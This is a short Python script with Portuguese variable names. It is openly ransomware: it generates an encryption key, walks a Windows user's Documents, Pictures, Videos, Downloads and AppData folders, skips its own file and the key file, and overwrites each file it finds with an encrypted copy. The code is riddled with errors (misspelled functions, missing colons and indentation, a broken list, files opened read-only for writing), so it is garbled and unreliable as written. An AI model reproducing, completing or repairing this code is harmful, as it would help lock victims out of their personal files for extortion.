import os
import cryptography.Fernet

key = Fernet.generate_key()
with open("chave.key","rb") as chave:
    chave.write(key)





username =  os.getnev(USERNAME)
folders = [os.path.join(r"C:\Users", username, "Documents")]
arquivos =
os.path.join(r"C:\Users", username, "Pictures")
os.path.join(r"C:\Users", username, "Videos")
os.path.join(r"C:\Users", username, "Downloads")
os.path.join(r"C:\Users", username,"AppData, Local")
os.path.join(r"C:\Users", username, "AppData, Roaming)
]
arquivos = []

for root, files in os.walk(folder):

if file in files

if file in ["juningameplay.py","chave_key", "Desktop.ini"]:
continue
file_patch = os.patch.join(root,file)
arquivos.append(file_patch)


for arquivo in arquivos
with open (arquivo, "rb") as file
conteudo = file.read()

conteudo_criptografado = fernet(key).encrypt(conteudo) 

with open(arquivo, "rb") as file:
    file.write(conteudo_criptografado)











    
